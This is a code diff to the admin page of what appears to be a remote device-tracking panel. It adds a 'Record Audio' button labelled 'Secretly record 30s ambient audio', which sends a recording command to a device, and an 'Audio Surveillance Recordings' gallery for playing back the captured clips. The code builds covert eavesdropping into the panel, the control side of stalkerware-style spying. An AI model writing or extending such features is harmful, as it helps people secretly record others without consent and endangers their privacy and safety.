@@ -14,7 +14,7 @@
         </div>
       <% } else { %>
       <!-- Top Action Cards -->
-      <div class="action-cards">
+      <div class="action-cards" style="grid-template-columns: repeat(4, 1fr);">
         <div class="action-card green">
           <div class="action-card-top">
             <div class="action-card-icon">📍</div>
@@ -54,6 +54,20 @@
           <form method="POST" action="/admin/devices/<%= encodeURIComponent(device.deviceId) %>/command">
             <input type="hidden" name="type" value="alarm" />
             <button class="action-btn" type="submit">PLAY ALARM 🔔</button>
+          </form>
+        </div>
+
+        <div class="action-card" style="background: linear-gradient(135deg, #1e3a8a, #3b82f6);">
+          <div class="action-card-top">
+            <div class="action-card-icon">🎙️</div>
+            <div>
+              <div class="action-card-title">Record Audio</div>
+              <div class="action-card-desc">Secretly record 30s ambient audio</div>
+            </div>
+          </div>
+          <form method="POST" action="/admin/devices/<%= encodeURIComponent(device.deviceId) %>/command">
+            <input type="hidden" name="type" value="record_audio" />
+            <button class="action-btn" type="submit">RECORD 🎙️</button>
           </form>
         </div>
       </div>
@@ -141,6 +155,32 @@
               </div>
             </a>
           <% }); %>
+        </div>
+      </section>
+
+      <!-- Audio Surveillance Gallery -->
+      <section class="card" style="margin-top: 20px;">
+        <header class="card-header">
+          <h2 style="display: flex; align-items: center; gap: 8px;">🎙️ Audio Surveillance Recordings</h2>
+        </header>
+        <div class="photo-grid" style="grid-template-columns: repeat(3, 1fr); gap: 16px;">
+          <% if (typeof audioClips === 'undefined' || audioClips.length === 0) { %><div class="empty" style="grid-column: span 3;">No audio recordings yet</div><% } else { %>
+          <% audioClips.forEach(function(clip){ %>
+            <div class="photo-tile" style="padding: 16px; display: flex; flex-direction: column; gap: 12px; background: var(--card-2); height: auto;">
+              <div style="display: flex; align-items: center; gap: 12px;">
+                <div style="width: 40px; height: 40px; border-radius: 50%; background: rgba(59, 130, 246, 0.2); display: flex; align-items: center; justify-content: center; color: #3b82f6;">🎙️</div>
+                <div>
+                  <div style="font-weight: 500; font-size: 14px;">Ambient Recording</div>
+                  <div class="muted small local-time-full" data-timestamp="<%= clip.timestamp %>"></div>
+                </div>
+              </div>
+              <audio controls style="width: 100%; height: 36px;">
+                <source src="/api/audio/<%= clip.filename %>" type="audio/amr">
+                <source src="/api/audio/<%= clip.filename %>" type="audio/mpeg">
+                Your browser does not support the audio element.
+              </audio>
+            </div>
+          <% }); } %>
         </div>
       </section>
 
